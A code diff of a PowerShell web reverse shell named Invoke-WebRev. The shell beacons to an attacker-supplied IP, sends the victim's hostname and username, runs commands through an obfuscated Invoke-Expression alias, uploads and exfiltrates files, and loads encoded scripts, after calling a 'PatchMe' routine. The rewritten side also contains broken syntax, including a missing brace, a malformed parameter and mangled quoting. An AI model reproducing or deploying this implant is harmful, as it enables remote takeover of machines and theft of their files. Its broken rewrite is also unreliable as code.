@@ -6,197 +6,181 @@ function Invoke-WebRev {
         [switch]$ssl
     )
 
-    if(-not $ip -or -not $port) { return }
+    if (-not $ip -or -not $port) { return }
 
-    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
+    $url = if ($ssl) { "https://$ip:$port/" } else { "http://$ip:$port/" }
 
-    [array]$shurmano = "I","n","t","E","r","n","e","X" ;set-alias taleska-ei-vrixeka $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
+    # Define alias for a function
+    [array]$shurmano = "I", "n", "t", "E", "r", "n", "e", "X"
+    set-alias taleska-ei-vrixeka $($shurmano | ForEach-Object { if ($_ -cmatch '[A-Z]') { $x += $_ } })
 
-    $pwd_b64 = getPwd;
-    $hname = toBase64 -str "$env:computername";
-    $cuser = toBase64 -str "$env:username";
-    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}'
+    $pwd_b64 = getPwd
+    $hname = toBase64 -str "$env:computername"
+    $cuser = toBase64 -str "$env:username"
+    $json = "{`"type`":`"newclient`",`"result`":`"`",`"pwd`":`"$pwd_b64`",`"cuser`":`"$cuser`",`"hostname`":`"$hname`"}"
 
-    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
-    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
-    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
-    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
+    # Set up web request proxy
+    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
+    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
+    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 
-    try { $error[0] = ""; } catch {}
+    try {
+        PatchMe
+        $previous_functions = (Get-Command -CommandType Function).Name
+        [array]$preloaded_functions = (Get-Command -CommandType Function | Where-Object { ($_.Name).Length -ge 4 } | Select-Object Name | Format-Table -HideTableHeaders | Out-String)
 
-    PatchMe;
+        while ($true) {
+            try {
+                $req = Invoke-WebRequest $url -UseBasicP -Method POST -Body $json -User Agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json"
+                $header = $req.Headers["Authorization"]
+                $c = [System.Convert]::FromBase64String($header)
+                $cstr = [System.Text.Encoding]::UTF8.GetString($c)
 
-    $previous_functions = (ls function:).Name;
-    [array]$preloaded_functions = (ls function: | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream );
-
-    while ($true)
-    {
-        try
-        {
-            $req = Invoke-WebRequest $url -useb -Method POST -Body $json -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json";
-            $header = $req.Headers["Authorization"];
-            $c = [System.Convert]::FromBase64String($header);
-            $cstr = [System.Text.Encoding]::UTF8.GetString($c);
-
-            if($cstr.split(" ")[0] -eq "autocomplete")
-            {
-                $functs = (Get-Command | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream);
-                $functs = toBase64 -str "$functs";
-                $type = 'type":"4UT0C0MPL3T3"';
-                $result = $functs;
-            }
-            elseif($cstr.split(" ")[0] -eq "upload")
-            {
-                $type = 'type":"UPL04D"';
-                try
-                {
-                    $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
-                    if ($cstr.split(" ").Length -eq 3) {
-                        $location = $cstr.split(" ")[2];
-                    }
-                    elseif ($cstr.Substring($cstr.Length-1 ) -eq '"') {
-                        $location = $cstr.split('"') | Select-Object -SkipLast 1 | Select-Object -Last 1;
-                    }
-                    else {
-                        $location = $cstr.split(' ') | Select-Object -Last 1;
-                    }
-                    $content = [System.Convert]::FromBase64String($uploadData);
-                    $content | Set-Content $location -Encoding Byte;
-                    $result = '[+] File successfully uploaded.';
+                # Handle different command types
+                if ($cstr.split(" ")[0] -eq "autocomplete") {
+                    $functs = (Get-Command | Where-Object { ($_.Name).Length -ge 4 } | Select-Object Name | Format-Table -HideTableHeaders | Out-String)
+                    $functs = toBase64 -str "$functs"
+                    $type = 'type":"4UT0C0MPL3T3'
+                    $result = $functs
                 }
-                catch {}
-            }
-            elseif($cstr.split(" ")[0] -eq "download")
-            {
-                $type = 'type":"D0WNL04D"';
-                try
-                {
-                    if ($cstr.split(" ").Length -eq 3){
-                        $cstr = $cstr.Replace('"', '');
-                        $pathSrc = $cstr.split(" ")[1];
-                        $pathDst = $cstr.split(" ")[2];
-                    }
-                    elseif ($cstr.Substring($cstr.Length-1) -eq '"'){
-                        if ($cstr.split(' ')[1][0] -eq '"') {
-                            $pathSrc = $cstr.split('"')[1];
-                        } else {
-                            $pathSrc = $cstr.split(' ')[1];
+                elseif ($cstr.split(" ")[0] -eq "upload") {
+                    $type = 'type":"UPL04D'
+                    try {
+                        $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content)
+                        if ($cstr.split(" ").Length -eq 3) {
+                            $location = $cstr.split(" ")[2]
                         }
-                        $pathDst = $cstr.split('"')[-2];
+                        elseif ($cstr.Substring($cstr.Length - 1) -eq '"') {
+                            $location = $cstr.split('"') | Select-Object -SkipLast 1 | Select-Object -Last 1;
+                        else {
+                            $location = $cstr.split(' ') | Select-Object -Last 1
+                        }
+                        $content = [System.Convert]::FromBase64String($uploadData)
+                        $content | Set-Content $location -Encoding Byte
+                        $result = '[+] File successfully uploaded.'
                     }
-                    else {
-                        $pathSrc = $cstr.split('"')[1];
-                        $pathDst = $cstr.split(' ')[-1];
-                    }
+                    catch {}
+                }
+                elseif ($cstr.split(" ")[0] -eq "download") {
+                    $type = 'type":"D0WNL04D'
+                    try {
+                        if ($cstr.split(" ").Length -eq 3) {
+                            $cstr = $cstr.Replace('"', '')
+                            $pathSrc = $cstr.split(" ")[1]
+                            $pathDst = $cstr.split(" ")[2]
+                        }
+                        elseif ($cstr.Substring($cstr.Length - 1) -eq '"') {
+                            if ($cstr.split(' ')[1][0] -eq '"') {
+                                $pathSrc = $cstr.split('"')[1]
+                            } else {
+                                $pathSrc = $cstr.split(' ')[1]
+                            }
+                            $pathDst = $cstr.split('"')[-2]
+                        }
+                        else {
+                            $pathSrc = $cstr.split('"')[1]
+                            $pathDst = $cstr.split(' ')[-1]
+                        }
 
-                    if (Test-Path -Path $pathSrc) 
-                    {
-                        $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
-                        $b64 = [System.Convert]::ToBase64String($downloadData);
-                        $result = '[+] File successfully downloaded.';
-                        $type = $type + ', "file":"' + $b64 + '", "pathDst":"' + $pathDst + '"';
-                    } 
-                    else
-                    {
-                        $type = 'type":"3RR0R"';
-                        $result = '[!] Source file not found!';
+                        if (Test-Path -Path $pathSrc) {
+                            $downloadData = [System.IO.File]::ReadAllBytes($pathSrc)
+                            $b64 = [System.Convert]::ToBase64String($downloadData)
+                            $result = '[+] File successfully downloaded.'
+                            $type = "$type, `\"file`\":`"$b64`", `\"pathDst`\":`"$pathDst`""
+                        }
+                        else {
+                            $type = 'type":"3RR0R'
+                            $result = '[!] Source file not found!'
+                        }
+                    }
+                    catch {}
+                }
+                elseif ($cstr.split(" ")[0] -eq "loadps1") {
+                    $type = 'type":"L04DPS1'
+                    try {
+                        $loadData = [System.Text.Encoding]::ASCII.GetString($req.Content)
+                        $loadData = $loadData.ToCharArray()
+                        [array]::Reverse($loadData)
+                        $loadData = -join($loadData)
+                        $content = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($loadData))
+                        taleska-ei-vrixeka $content | Out-String
+                        $result = '[+] File loaded successfully.'
+                    }
+                    catch {
+                        $type = 'type":"3RR0R'
+                        $result = '[!] Error loading PS1!'
                     }
                 }
-                catch {}
-            }
-            elseif($cstr.split(" ")[0] -eq "loadps1")
-            {
-                $type = 'type":"L04DPS1"';
-                try
-                {
-                    $loadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
-                    $loadData = $loadData.ToCharArray();
-                    [array]::Reverse($loadData);
-                    $loadData = -join($loadData);
-                    $content = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($loadData));
-                    taleska-ei-vrixeka $content | Out-String;
-                    $result = '[+] File loaded successfully.';
-                }
-                catch
-                {
-                    $type = 'type":"3RR0R"';
-                    $result = '[!] Error loading PS1!';
-                }
-            }
-            else
-            {
-                $type = 'type":"C0MM4ND"';                
-                $enc = [system.Text.Encoding]::UTF8;
-                $new = (taleska-ei-vrixeka $cstr | Out-String);
+                else {
+                    $type = 'type":"C0MM4ND'
+                    $enc = [system.Text.Encoding]::UTF8
+                    $new = (taleska-ei-vrixeka $cstr | Out-String)
 
-                $bytes = $enc.GetBytes($new);
-                $bytes2 = $enc.GetBytes($result);
-                $result = [Convert]::ToBase64String($bytes2 + $bytes);
-            }
+                    $bytes = $enc.GetBytes($new)
+                    $bytes2 = $enc.GetBytes($result)
+                    $result = [Convert]::ToBase64String($bytes2 + $bytes)
+                }
 
-            if ($cstr.split(" ")[0] -eq "cd") {
-                $pwd_b64 = getPwd;
+                if ($cstr.split(" ")[0] -eq "cd") {
+                    $pwd_b64 = getPwd
+                }
+                $json = "{`"$type`", `\"result`\":`"$result`", `\"pwd`\":`"$pwd_b64`"}"
             }
-            $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
+            catch {
+                if ($error[0] -ne "") {
+                    try {
+                        $type = 'type":"3RR0R'
+                        $err = $error[0] | Out-String
+                        $error[0] = ""
+
+                        $bytes = $enc.GetBytes($err)
+                        $result = [Convert]::ToBase64String($bytes)
+                        $json = "{`"$type`", `\"result`\":`"$result`", `\"pwd`\":`"$pwd_b64`", `\"cuser`\":`"$cuser`", `\"hostname`\":`"$hname`"}"
+                    } catch {}
+                }
+            }
         }
-        catch
-        {
-            if ($error[0] -ne "")
-            {
-                try
-                {
-                    $type = 'type":"3RR0R"';
-                    $err = $error[0] | Out-String;
-                    $error[0]= "";
-
-                    $bytes = $enc.GetBytes($err);
-                    $result = [Convert]::ToBase64String($bytes);
-                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}';
-                } catch {}
-            }
-        };
-    };
+    }
 }
 
-function toBase64
-{
+function toBase64 {
     Param([String] $str)
 
-    $enc = [system.Text.Encoding]::UTF8;
-    $bytes = $enc.GetBytes($str);
-    $result = [Convert]::ToBase64String($bytes);
-    return $result;
+    $enc = [system.Text.Encoding]::UTF8
+    $bytes = $enc.GetBytes($str)
+    $result = [Convert]::ToBase64String($bytes)
+    return $result
 }
 
-function getPwd()
-{
-    $enc = [system.Text.Encoding]::UTF8 $pwd = "pwd | Format-Table -HideTableHeaders";
-    $pwd_res = (taleska-ei-vrixeka $pwd | Out-String);
-    $bytes = $enc.GetBytes($pwd_res);
-    $pwd_b64 = [Convert]::ToBase64String($bytes);
-    return $pwd_b64;
+function getPwd() {
+    $enc = [system.Text.Encoding]::UTF8
+    $pwd = "pwd | Format-Table -HideTableHeaders"
+    $pwd_res = (taleska-ei-vrixeka $pwd | Out-String)
+    $bytes = $enc.GetBytes($pwd_res)
+    $pwd_b64 = [Convert]::ToBase64String($bytes)
+    return $pwd_b64
 }
 
-function Get-ImportedFunctions
-{
+function Get-ImportedFunctions {
     $menu = ""
 
-    if ([int]$PSVersionTable.PSVersion.Major -ge 4 ) {
-        $current_functions = (ls function:).Name
-        [array]$preloaded_functions = "Close_Console","Close_DNS","Close_TCP","Close_UDP","Main","Main_Powershell","ReadData_CMD","ReadData_Console","ReadData_DNS","ReadData_TCP","ReadData_UDP","Setup_CMD","Setup_Console","Setup_DNS","Setup_TCP","Setup_UDP", "Stream1_Close","Stream1_ReadData","Stream1_Setup","Stream1_WriteData","WriteData_CMD","WriteData_Console","WriteData_DNS","WriteData_TCP","WriteData_UDP","Close_CMD","menu","f","func"
+    if ([int]$PSVersionTable.PSVersion.Major -ge 4) {
+        $current_functions = (Get-Command -CommandType Function).Name
+        [array]$preloaded_functions = "Close_Console", "Close_DNS", "Close_TCP", "Close_UDP", "Main", "Main_Powershell", "ReadData_CMD", "ReadData_Console", "ReadData_DNS", "ReadData_TCP", "ReadData_UDP", "Setup_CMD", "Setup_Console", "Setup_DNS", "Setup_TCP", "Setup_UDP", "Stream1_Close", "Stream1_ReadData", "Stream1_Setup", "Stream1_WriteData", "WriteData_CMD", "WriteData_Console", "WriteData_DNS", "WriteData_TCP", "WriteData_UDP", "Close_CMD", "menu", "f", "func"
         $current_functions = $current_functions + $preloaded_functions
         $new_functions = (Compare-Object -ReferenceObject $previous_functions -DifferenceObject $current_functions).InputObject
-        $output = foreach ($new_function in $new_functions) { if ($preloaded_functions -notcontains $new_function) {"`n [+] $new_function"}}
-        $menu = $menu + $output + "`n";
+        $output = foreach ($new_function in $new_functions) { if ($preloaded_functions -notcontains $new_function) { "`n [+] $new_function" } }
+        $menu = $menu + $output + "`n"
     } else {
-        [array]$new_functions = (ls function: | Where-Object {($_.name).Length -ge "4" -and $_.name -notlike "Close_*" -and $_.name -notlike "ReadData_*" -and $_.name -notlike "Setup_*" -and $_.name -notlike "Stream1_*" -and $_.name -notlike "WriteData_*" -and $_.name -notlike "Menu" -and $_.name -ne "f" -and $_.name -ne "func" -and $_.name -ne "Main" -and $_.name -ne "Main_Powershell"} | select-object name | format-table -HideTableHeaders | Out-String )
-        $show_functions = ($new_functions | where {$preloaded_functions -notcontains $_}) | foreach {"`n[+] $_"}
-        $show_functions = $show_functions -replace "  ","" 
+        [array]$new_functions = (Get-Command -CommandType Function | Where-Object { ($_.Name).Length -ge 4 -and $_.Name -notlike "Close_*" -and $_.Name -notlike "ReadData_*" -and $_.Name -notlike "Setup_*" -and $_.Name -notlike "Stream1_*" -and $_.Name -notlike "WriteData_*" -and $_.Name -notlike "Menu" -and $_.Name -ne "f" -and $_.Name -ne "func" -and $_.Name -ne "Main" -and $_.Name -ne "Main_Powershell" } | Select-Object Name | Format-Table -HideTableHeaders | Out-String)
+        $show_functions = ($new_functions | Where-Object { $preloaded_functions -notcontains $_ }) | ForEach-Object { "`n[+] $_" }
+        $show_functions = $show_functions -replace "  ", ""
         $menu = $menu + $show_functions + "`n"
-        $menu = $menu -replace " [+]","[+]"
+        $menu = $menu -replace " [+]", "[+]"
     }
-    return $menu;
+    return $menu
 }
 
 
